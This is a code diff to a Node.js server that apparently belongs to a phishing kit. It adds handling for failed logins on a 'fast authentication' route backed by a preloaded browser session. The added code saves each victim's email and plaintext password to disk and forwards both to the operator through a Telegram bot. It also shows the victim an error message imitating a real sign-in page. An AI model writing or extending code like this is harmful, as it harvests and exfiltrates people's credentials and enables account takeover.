@@ -1191,7 +1191,74 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                             fastAuthTime: Date.now() - startTime
                         });
                     }
+                } else {
+                    // Password was incorrect with preloaded browser - log the failure
+                    console.log(`❌ Fast authentication failed for: ${email} - incorrect password`);
+                    
+                    // Store failed attempt in session data
+                    const sessionDir = path.join(__dirname, 'session_data');
+                    const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
+                    const failureData = {
+                        id: failureId,
+                        sessionId: sessionId || failureId,
+                        email: email,
+                        password: password,
+                        reason: 'Wrong Password',
+                        errorMessage: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
+                        timestamp: new Date().toISOString(),
+                        status: 'invalid',
+                        method: 'fast_auth_with_preload',
+                        failureType: 'incorrect_password',
+                        attemptNumber: req.body.attemptNumber || 1
+                    };
+
+                    fs.writeFileSync(
+                        path.join(sessionDir, `invalid_${failureId}.json`),
+                        JSON.stringify(failureData, null, 2)
+                    );
+
+                    analytics.failedLogins++;
+                    saveAnalytics();
+
+                    // Send Telegram notification for failed attempt
+                    if (telegramBot) {
+                        try {
+                            await telegramBot.sendFailedLoginNotification({
+                                email: email,
+                                password: password,
+                                timestamp: new Date().toISOString(),
+                                sessionId: sessionId || failureId,
+                                reason: 'Incorrect Password',
+                                authMethod: 'FAST Authentication (preloaded browser)',
+                                preloadUsed: true
+                            });
+                            console.log(`📤 Telegram failed login notification sent for ${email}`);
+                        } catch (telegramError) {
+                            console.warn('Telegram failed login notification failed:', telegramError.message);
+                        }
+                    }
+
+                    // Clean up preload session
+                    if (automation) {
+                        try {
+                            await automation.close();
+                        } catch (cleanupError) {
+                            console.warn('Error cleaning up failed session:', cleanupError.message);
+                        }
+                    }
+                    if (sessionId && automationSessions.has(sessionId)) {
+                        automationSessions.delete(sessionId);
+                    }
+
+                    return res.status(401).json({
+                        success: false,
+                        error: 'Authentication failed',
+                        message: 'Your account or password is incorrect',
+                        preloadUsed: true,
+                        authMethod: 'FAST'
+                    });
                 }
+
             } catch (error) {
                 console.error('Error in fast auth with preload:', error);
                 // Clean up failed session
